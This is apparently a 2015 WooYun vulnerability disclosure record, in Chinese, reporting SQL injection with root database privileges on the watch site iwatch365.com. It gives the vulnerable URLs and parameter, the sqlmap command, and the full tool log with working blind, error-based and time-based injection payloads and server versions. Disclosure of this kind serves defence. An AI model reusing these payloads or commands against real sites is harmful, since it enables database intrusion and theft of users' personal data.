{"id": 84409, "wybug_id": "wooyun-2015-0144911", "wybug_title": "爱表族官网多处Root权限SQL注入导致120万用户信息泄露（可getshell)", "wybug_corp": "爱表族", "wybug_author": "路人甲", "wybug_date": "2015-10-06 13:23", "wybug_open_date": "2015-11-20 13:24", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数据库账户权限过高"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-06：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-11-20：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 爱表族官网多处Root权限SQL注入导致120万用户信息泄露（可getshell)通过论坛：http://www.iwatch365.com/forum.php得知会员总数  详细说明：  注入点：http://www.iwatch365.com/watch/?px=6&desc=desc        http://www.iwatch365.com/index.php?m=content&c=index&a=lists&catid=81&ids=         （直接报错页面）通过论坛：http://www.iwatch365.com/forum.php得知会员总数 1189045【手工测试】：desc参数后加单引号页面最下方直接报错\nMySQL Query : SELECT COUNT(*) as count FROM biao_wanbiaomoxing_data p where 1 order by p.guoneijia desc\\'    MySQL Error : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\\'' at line 1    MySQL Errno : 1064    Message : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\\'' at line 1    Need Help?\n【sqlmap】：python sqlmap.py -u \"http://www.iwatch365.com/watch/?px=6&desc=desc\" -p desc 【sqlmap截图】：\n\n【数据库信息】：\n\n\n\n【DBA权限 故虽然我没找到论坛的数据库表，但是既然最高权限了，主站下的数据都不在话下了吧？】\n\n   漏洞证明：  sqlmap全过程：\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 17:23:18[17:23:18] [INFO] testing connection to the target URL[17:23:19] [INFO] testing if the target URL is stable. This can take a couple of seconds[17:23:20] [INFO] target URL is stable[17:23:21] [INFO] heuristic (basic) test shows that GET parameter 'desc' might be injectable (possible DBMS: 'MySQL')[17:23:21] [INFO] testing for SQL injection on GET parameter 'desc'heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do youwant to skip test payloads specific for other DBMSes? [Y/n]do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n][17:23:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[17:23:23] [WARNING] reflective value(s) found and filtering out[17:23:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'[17:23:30] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'[17:23:39] [INFO] testing 'MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)'[17:23:44] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'[17:23:44] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT -original value)'[17:23:45] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'[17:23:46] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace(original value)'[17:23:46] [INFO] testing 'MySQL < 5.0 boolean-based blind - Parameter replace (original value)'[17:23:47] [INFO] testing 'MySQL >= 5.0 boolean-based blind - GROUP BY and ORDER BY clauses'[17:23:48] [INFO] GET parameter 'desc' seems to be 'MySQL >= 5.0 boolean-based blind - GROUP BY and ORDER BY clauses' injectable[17:23:48] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace'[17:23:48] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'[17:23:49] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'[17:23:49] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINTUNSIGNED)'[17:23:49] [INFO] testing 'MySQL >= 5.0 error-based - GROUP BY and ORDER BY clauses'[17:23:50] [INFO] GET parameter 'desc' is 'MySQL >= 5.0 error-based - GROUP BY and ORDER BY clauses' injectable[17:23:50] [INFO] testing 'MySQL inline queries'[17:23:50] [INFO] testing 'MySQL > 5.0.11 stacked queries'[17:23:50] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'[17:23:50] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[17:23:51] [INFO] testing 'MySQL > 5.0.11 AND time-based blind (comment)'[17:23:51] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query)'[17:23:51] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query - comment)'[17:23:51] [INFO] testing 'MySQL > 5.0.11 OR time-based blind'[17:23:59] [INFO] GET parameter 'desc' seems to be 'MySQL > 5.0.11 OR time-based blind' injectable[17:23:59] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'[17:23:59] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found[17:24:05] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'[17:24:12] [INFO] testing 'MySQL UNION query (NULL) - 22 to 40 columns'[17:24:19] [INFO] testing 'MySQL UNION query (random number) - 22 to 40 columns'[17:24:25] [INFO] testing 'MySQL UNION query (NULL) - 42 to 60 columns'[17:24:32] [INFO] testing 'MySQL UNION query (random number) - 42 to 60 columns'[17:24:39] [INFO] testing 'MySQL UNION query (NULL) - 62 to 80 columns'[17:24:45] [INFO] testing 'MySQL UNION query (random number) - 62 to 80 columns'[17:24:52] [INFO] testing 'MySQL UNION query (NULL) - 82 to 100 columns'[17:24:58] [INFO] testing 'MySQL UNION query (random number) - 82 to 100 columns'[17:25:05] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'GET parameter 'desc' is vulnerable. Do you want to keep testing the others (if any)? [y/N]sqlmap identified the following injection points with a total of 292 HTTP(s) requests:---Parameter: desc (GET)    Type: boolean-based blind    Title: MySQL >= 5.0 boolean-based blind - GROUP BY and ORDER BY clauses    Payload: px=6&desc=desc,(SELECT (CASE WHEN (3448=3448) THEN 0x64657363 ELSE3448*(SELECT 3448 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))    Type: error-based    Title: MySQL >= 5.0 error-based - GROUP BY and ORDER BY clauses    Payload: px=6&desc=desc,(SELECT 6385 FROM(SELECT COUNT(*),CONCAT(0x7176717071,(SELECT (CASE WHEN (6385=6385) THEN 1 ELSE 0 END)),0x7171787671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 OR time-based blind    Payload: px=6&desc=-1369 OR 2737=SLEEP(5)---[17:25:31] [INFO] the back-end DBMS is MySQLweb application technology: Apache 2.2.21, PHP 5.4.16back-end DBMS: MySQL 5.0\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}